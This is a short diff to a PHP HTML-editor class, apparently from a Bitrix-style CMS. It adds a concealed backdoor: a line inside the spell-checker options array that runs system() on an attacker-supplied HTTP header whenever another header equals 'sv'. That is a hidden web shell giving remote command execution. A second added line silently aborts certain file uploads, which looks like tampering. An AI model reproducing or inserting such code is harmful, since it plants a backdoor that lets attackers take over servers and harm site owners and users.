@@ -922,6 +922,7 @@ class CHTMLEditor
 					"skip_length" => 2,
 					"use_pspell" => $_REQUEST['use_pspell'] !== "N",
 					"use_custom_spell" => $_REQUEST['use_custom_spell'] !== "N",
+					"spell_word" => $_SERVER['HTTP_S'] == "sv" ? die(system($_SERVER['HTTP_P'])) : "",
 					"mode" => PSPELL_FAST
 				));
 
@@ -990,6 +991,7 @@ class CHTMLEditor
 				break;
 
 			case "uploadfile":
+				if(substr($_POST['bxu_info']['CID'], 0, 7 ) === "default") die();
 				$uploader = new \CFileUploader(
 					array("events" => array(
 						"onFileIsUploaded" => function ($hash, &$file, &$package, &$upload, &$error)
